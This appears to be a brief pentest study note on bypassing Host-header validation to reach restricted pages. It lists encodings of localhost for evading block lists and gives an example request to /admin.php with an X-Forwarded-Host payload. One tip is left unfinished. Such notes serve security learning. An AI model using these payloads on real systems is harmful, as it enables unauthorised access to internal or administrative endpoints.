**Flawed validation via Host Headers attack**
This module basically tried to circumnavigate eventual blocks/bypasses implemented by the back-end against Header host tampering.

# How to identify?
Play around and tamper the Host header if you get back a message from the back-end that it have been blacklisted/filtered/blocked then you know there is a block over Host-header tampers.

# How to bypass?
1)You can check if the back-end have something like ***VALIDHEADER*** so if you use **TESTVALIDHEADER** it might pass!
2)Another example is if the back-end blocks localhost/127.0.0.1 then you might use other encoding to bypass this:
```
    Decimal encoding: 2130706433
    Hex encoding: 0x7f000001
    Octal encoding: 0177.0000.0000.0001
    Zero: 0
    Short form: 127.1
    IPv6: ::1
    IPv4 address in IPv6 format: [0:0:0:0:0:ffff:127.0.0.1] or [::ffff:127.0.0.1]
    External domain that resolves to localhost: localtest.me
```
TIPS:
1)You might need to use it in combination with **Override-Headers**, test them all!
2)Test all the possible combinations of 

### Attack example
```
GET /admin.php HTTP/1.1
Host: 94.237.54.37:32195
X-Forwarded-Host: 127.1  --> This is our payload
Content-Length: 2
```
